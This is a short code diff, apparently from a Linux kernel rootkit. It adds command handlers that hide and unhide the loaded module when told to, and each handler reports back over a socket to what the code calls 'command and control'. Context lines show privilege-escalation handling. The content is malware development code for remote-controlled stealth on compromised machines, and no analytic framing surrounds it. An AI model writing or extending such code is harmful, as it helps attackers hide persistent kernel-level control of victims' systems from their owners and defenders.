@@ -1,6 +1,7 @@
 #include "server.h"
 #include "utils.h"
 #include "sys_escalation.h"
+#include "module_hiding.h"
 
 struct kthread_t *kthread = NULL;
 
@@ -27,6 +28,30 @@ void server_do(const char *command, struct sockaddr_in *addr)
 
     /* notify command and control */
     size = server_snd(kthread->sock, &kthread->addr, RESP_PRIV_UNDO, strlen(RESP_PRIV_UNDO));
+
+    if (size < 0)
+      debug_print("Unable to send response to command and control");
+  }
+
+  if (!strncmp(command, DO_HIDE_MODULE, strlen(DO_HIDE_MODULE))) {
+    debug_print("Executing command \"%s\"", DO_HIDE_MODULE);
+
+    do_hide_module();
+
+    /* notify command and control */
+    size = server_snd(kthread->sock, &kthread->addr, RESP_HIDE_MODULE_DO, strlen(RESP_HIDE_MODULE_DO));
+
+    if (size < 0)
+      debug_print("Unable to send response to command and control");
+  }
+
+  if (!strncmp(command, DO_SHOW_MODULE, strlen(DO_SHOW_MODULE))) {
+    debug_print("Executing command \"%s\"", DO_SHOW_MODULE);
+
+    do_show_module();
+
+    /* notify command and control */
+    size = server_snd(kthread->sock, &kthread->addr, RESP_SHOW_MODULE_DO, strlen(RESP_SHOW_MODULE_DO));
 
     if (size < 0)
       debug_print("Unable to send response to command and control");
